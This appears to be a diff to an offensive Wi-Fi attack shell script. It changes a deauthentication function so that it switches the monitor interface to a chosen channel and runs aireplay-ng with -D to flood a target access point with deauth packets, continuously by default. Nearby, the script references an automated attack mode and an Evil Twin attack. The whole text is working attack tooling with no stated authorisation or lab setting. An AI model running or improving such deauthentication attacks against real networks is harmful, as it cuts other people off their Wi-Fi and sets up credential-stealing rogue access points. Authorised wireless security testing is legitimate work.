@@ -206,13 +206,20 @@ auto_attack() {
 deauth_attack() {
     local bssid="$1"
     local count="${2:-0}"  # 0 = continuous
+    local channel="$3"
     
     if [[ -z "$bssid" ]]; then
-        log_error "Usage: $0 --deauth <BSSID> [COUNT]"
+        log_error "Usage: $0 --deauth <BSSID> [COUNT] [CHANNEL]"
         exit 1
     fi
     
     enable_monitor_mode
+    
+    if [[ -n "$channel" ]]; then
+        log_info "Switching $MONITOR_INTERFACE to channel $channel..."
+        iwconfig "$MONITOR_INTERFACE" channel "$channel"
+        sleep 1
+    fi
     
     log_info "Sending deauth packets to $bssid"
     if [[ "$count" -eq 0 ]]; then
@@ -220,7 +227,8 @@ deauth_attack() {
     fi
     echo ""
     
-    aireplay-ng --deauth "$count" -a "$bssid" "$MONITOR_INTERFACE"
+    # -D disables AP selection check (useful if we already set channel)
+    aireplay-ng --deauth "$count" -a "$bssid" -D "$MONITOR_INTERFACE"
 }
 
 # Evil Twin attack
